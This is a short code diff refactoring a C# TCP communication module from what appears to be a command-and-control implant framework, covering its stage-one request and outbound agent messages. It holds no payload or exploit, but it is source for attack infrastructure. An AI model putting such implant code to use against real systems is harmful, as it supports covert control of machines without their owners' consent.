@@ -10,7 +10,7 @@ class TcpCommModule : CommModule
     TcpListener Listener;
     ManualResetEvent Status = new ManualResetEvent(false);
 
-    public TcpCommModule(string agentID, string bindAddress, int bindPort) : base(agentID)
+    public TcpCommModule(string bindAddress, int bindPort)
     {
         Listener = new TcpListener(IPAddress.Parse(bindAddress), bindPort);
     }
@@ -41,16 +41,15 @@ class TcpCommModule : CommModule
         Listener.Stop();
     }
 
-    public void QueueStageRequest(string parentID)
+    public void QueueStageRequest()
     {
         var message = new AgentMessage
         {
-            Metadata = base.GetMetadata(),
+            Metadata = Metadata,
             Data = new C2Data
             {
                 Module = "Core",
-                Command = "StageOneRequest",
-                Data = Encoding.UTF8.GetBytes(parentID)
+                Command = "StageOneRequest"
             }
         };
 
@@ -94,7 +93,7 @@ class TcpCommModule : CommModule
             }
         }
 
-        AgentMessage outbound = new AgentMessage { Metadata = base.GetMetadata() };
+        AgentMessage outbound = new AgentMessage { Metadata = Metadata };
         
         if (Outbound.Count > 0)
         {
